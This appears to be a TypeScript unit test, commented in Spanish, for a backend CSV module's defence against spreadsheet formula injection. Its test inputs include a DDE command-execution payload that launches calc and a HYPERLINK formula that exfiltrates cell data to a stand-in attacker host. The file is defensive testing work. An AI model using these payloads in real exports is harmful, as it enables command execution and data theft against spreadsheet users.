// Test aislado de csv.ts (sin dependencias externas: `node --test` sobre tsx).
//   npx tsx --test backend/src/servicios/csv.test.ts
//
// Cubre la mitigacion de CSV formula injection y verifica que el escape de
// comillas/comas y el parser de la plantilla de alta en lote no cambiaron.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { generarCsv, parsearCsv } from './csv.js';

const BOM = '﻿';

/** Celdas de la unica fila de datos del CSV generado. */
function celdas(valores: unknown[]): string {
  const csv = generarCsv(['a'], [valores]);
  assert.ok(csv.startsWith(BOM), 'el CSV debe conservar el BOM');
  return csv.slice(BOM.length).split('\r\n')[1];
}

test('prefija con apostrofo las celdas que Excel evaluaria como formula', () => {
  assert.equal(celdas(['=1+1']), "'=1+1");
  assert.equal(celdas(['+1x']), "'+1x");
  assert.equal(celdas(['-1x']), "'-1x");
  assert.equal(celdas(['@SUM(A1)']), "'@SUM(A1)");
  assert.equal(celdas(['\tx']), "'\tx");
  // El CR obliga ademas a entrecomillar, como ya ocurria antes del fix.
  assert.equal(celdas(['\rx']), '"\'\rx"');
});

test('los numeros puros NO llevan apostrofo (no se rompen columnas numericas)', () => {
  // Un numero puro jamas se evalua como formula en Excel.
  assert.equal(celdas(['-100.38']), '-100.38'); // longitud del export de auditoria
  assert.equal(celdas(['-1']), '-1');
  assert.equal(celdas(['-0.5']), '-0.5');
  assert.equal(celdas(['20.59']), '20.59'); // latitud
  assert.equal(celdas(['123']), '123');
  assert.equal(celdas([-100.38]), '-100.38'); // llega como number, no string
  assert.equal(celdas([-1]), '-1');
});

test('lo que solo PARECE numero sigue prefijado', () => {
  assert.equal(celdas(['-100.38x']), "'-100.38x");
  assert.equal(celdas(['-CMD|calc']), "'-CMD|calc");
  assert.equal(celdas(['-1-1']), "'-1-1");
  assert.equal(celdas(['-1.2.3']), "'-1.2.3");
  assert.equal(celdas(['+1']), "'+1"); // el `+` no forma parte de NUMERO_PURO
  assert.equal(celdas(['=1']), "'=1");
  assert.equal(celdas([' -1']), ' -1'); // no empieza con caracter de formula
  // Payload clasico de ejecucion de comandos con guion inicial.
  const dde = '-2+3+cmd|\' /C calc\'!A0';
  assert.ok(celdas([dde]).includes("'-2+3+cmd"), 'DDE debe quedar prefijado');
});

test('neutraliza el ataque real de exfiltracion via HYPERLINK', () => {
  const ataque = '=HYPERLINK("http://atacante.example/robo?d="&A1,"ver")';
  const celda = celdas([ataque]);
  assert.ok(celda.startsWith('"\'='), `no quedo neutralizada: ${celda}`);
  // El escape de comillas dobles se sigue aplicando sobre el valor prefijado.
  assert.equal(celda, `"'${ataque.replace(/"/g, '""')}"`);
});

test('los valores normales no cambian respecto al comportamiento previo', () => {
  assert.equal(celdas(['Juan Pérez']), 'Juan Pérez');
  assert.equal(celdas(['REG-02']), 'REG-02'); // el guion NO va al inicio
  assert.equal(celdas(['22009;22010']), '22009;22010');
  assert.equal(celdas([123]), '123');
  assert.equal(celdas([null]), '');
  assert.equal(celdas([undefined]), '');
  assert.equal(celdas(['Pérez, Juan']), '"Pérez, Juan"');
  assert.equal(celdas(['dijo "hola"']), '"dijo ""hola"""');
  assert.equal(celdas(['linea1\nlinea2']), '"linea1\nlinea2"');
  assert.equal(celdas(['# ejemplo (borra esta línea): juan.perez']), '# ejemplo (borra esta línea): juan.perez');
});

test('parsearCsv sigue leyendo la plantilla de alta en lote sin cambios', () => {
  const columnas = [
    'usuario',
    'nombre_completo',
    'rol',
    'regional_clave',
    'alcance_municipios',
    'alcance_componentes'
  ];
  const ejemplo = [
    '# ejemplo (borra esta línea): juan.perez',
    'Juan Pérez Hernández',
    'ventanilla',
    'REG-02',
    '22009;22010',
    'DIN'
  ];
  const plantilla = generarCsv(columnas, [ejemplo]);
  // Ninguna celda de la plantilla empieza con un caracter de formula.
  assert.ok(!plantilla.includes("'"), 'la plantilla no debe llevar apostrofos');
  assert.deepEqual(parsearCsv(plantilla), [columnas, ejemplo]);
});

test('un valor prefijado sigue siendo leible por el parser (ida y vuelta)', () => {
  const original = ['=1+1', 'texto, con coma', 'con "comillas"'];
  assert.deepEqual(parsearCsv(generarCsv(['a', 'b', 'c'], [original])), [
    ['a', 'b', 'c'],
    ["'=1+1", 'texto, con coma', 'con "comillas"']
  ]);
});
